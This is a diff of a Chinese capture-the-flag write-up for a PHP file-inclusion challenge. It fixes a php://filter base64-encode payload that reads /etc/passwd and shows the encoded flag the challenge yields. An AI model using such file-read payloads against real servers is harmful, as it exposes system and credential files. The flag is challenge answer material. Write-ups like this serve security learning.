@@ -12,7 +12,7 @@ Date: 2020-12-18
 
 ![](./images/afr1.png)
 2. 这里我首先通过伪协议判断能不能读取/etc/passwd，没有反馈，在这里卡了很久
-    - php://filter/read=convert.base64-encode/
+    - php://filter/read=convert.base64-encode/resource=/etc/passwd
 3. 后来修改/etc/passwd为flag，获得base64码
     - PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9
 4. 解码得到
